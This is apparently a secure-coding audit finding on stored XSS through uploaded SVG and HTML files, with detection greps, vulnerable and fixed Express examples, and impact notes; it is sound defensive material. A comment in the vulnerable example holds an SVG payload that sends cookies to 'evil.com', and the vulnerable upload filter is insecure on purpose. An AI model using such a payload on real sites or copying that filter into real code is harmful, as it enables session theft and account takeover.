# OC-170: Stored XSS via Uploaded HTML/SVG

**Category:** Data Security
**Severity:** HIGH
**Auditors:** DATA-03, WEB-01
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
**OWASP:** A03:2021 – Injection

## Description

SVG and HTML files can contain embedded JavaScript that executes when the file is rendered in a browser. When an application allows uploading these file types and serves them with a content type that triggers browser rendering (`image/svg+xml`, `text/html`), any user who views the uploaded file will execute the embedded script in the context of the application's origin.

SVG files are particularly dangerous because they appear to be benign image files but are actually XML documents that support `<script>` elements, `onload` event handlers, `<foreignObject>` containing HTML, and `xlink:href` with `javascript:` URIs. Many applications that validate uploads against "image" types still accept SVGs without realizing they are a JavaScript execution vector.

This vulnerability has been found in major platforms. GitHub advisory GHSA-rf6j-xgqp-wjxg (Open eClass) documented unrestricted file upload leading to RCE where SVG uploads were a key vector. The OWASP Web Security Testing Guide specifically calls out SVG files as an XSS vector in file upload testing. Since the XSS executes on the application's origin, it can access cookies, session tokens, and perform any action the victim can.

## Detection

```
grep -rn "\.svg\|\.html\|\.htm\|image/svg\|text/html" --include="*.ts" --include="*.js"
grep -rn "Content-Type.*svg\|Content-Type.*html" --include="*.ts" --include="*.js"
grep -rn "X-Content-Type-Options\|nosniff" --include="*.ts" --include="*.js"
grep -rn "allowedTypes\|fileFilter\|accept" --include="*.ts" --include="*.js"
```

Look for: SVG or HTML in allowed upload types, serving uploaded files without `Content-Disposition: attachment`, missing `X-Content-Type-Options: nosniff` header, files served from the same origin as the application.

## Vulnerable Code

```typescript
import express from "express";
import multer from "multer";

const app = express();

// VULNERABLE: SVG files accepted and served inline
const upload = multer({
  dest: "public/uploads/",
  fileFilter: (req, file, cb) => {
    // Allows SVGs as "images"
    if (file.mimetype.startsWith("image/")) {
      cb(null, true);
    } else {
      cb(new Error("Only images"));
    }
  },
});

// SVG with XSS payload:
// <svg xmlns="http://www.w3.org/2000/svg">
//   <script>document.location='https://evil.com/?c='+document.cookie</script>
// </svg>

// Files served with original content type — browser executes SVG scripts
app.use(express.static("public"));

app.post("/avatar", upload.single("avatar"), (req, res) => {
  res.json({ url: `/uploads/${req.file!.filename}` });
});
```

## Secure Code

```typescript
import express from "express";
import multer from "multer";
import sharp from "sharp";
import crypto from "crypto";
import fs from "fs/promises";

const app = express();

// SECURE: Only allow raster image formats
const ALLOWED_TYPES = new Set(["image/jpeg", "image/png", "image/webp"]);

const upload = multer({
  dest: "/tmp/uploads/",
  limits: { fileSize: 5 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    // Reject SVG and HTML explicitly
    if (file.mimetype === "image/svg+xml" || file.mimetype.includes("html")) {
      return cb(new Error("SVG and HTML not allowed"));
    }
    cb(null, true);
  },
});

app.post("/avatar", upload.single("avatar"), async (req, res) => {
  if (!req.file) return res.status(400).end();

  // SECURE: Re-encode image through sharp — strips any embedded scripts
  const safeName = `${crypto.randomUUID()}.webp`;
  const outputPath = `/data/avatars/${safeName}`;

  await sharp(req.file.path)
    .resize(256, 256, { fit: "cover" })
    .webp({ quality: 80 })
    .toFile(outputPath);

  await fs.unlink(req.file.path); // Remove original
  res.json({ url: `/avatars/${safeName}` });
});

// SECURE: Serve uploads with security headers
app.get("/avatars/:name", (req, res) => {
  res.set("Content-Type", "image/webp");
  res.set("X-Content-Type-Options", "nosniff");
  res.set("Content-Security-Policy", "script-src 'none'");
  res.sendFile(`/data/avatars/${req.params.name}`);
});
```

## Impact

Stored XSS via uploaded files executes in the context of the application's origin, enabling session hijacking, account takeover, data exfiltration, and defacement. Unlike reflected XSS, stored XSS persists and affects every user who views the uploaded file. If admin users view the file, the attacker can escalate to administrative access.

## References

- GHSA-rf6j-xgqp-wjxg: Open eClass unrestricted file upload leading to XSS/RCE
- CWE-79: XSS — https://cwe.mitre.org/data/definitions/79.html
- OWASP A03:2021 – Injection
- OWASP Testing Guide: File Upload XSS vectors
- PortSwigger: SVG-based XSS attack vectors
